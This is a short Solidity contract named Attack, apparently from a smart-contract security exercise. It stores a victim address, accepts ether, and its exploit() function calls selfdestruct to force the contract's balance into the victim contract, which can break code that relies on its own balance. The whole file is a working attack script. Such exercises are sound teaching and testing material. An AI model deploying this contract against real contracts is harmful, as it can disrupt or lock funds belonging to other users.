// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    address payable public victim;

    constructor(address payable _victim) public {
        victim = _victim;
    }

    function exploit() public {
        selfdestruct(victim);
    }
    receive() payable external{}
}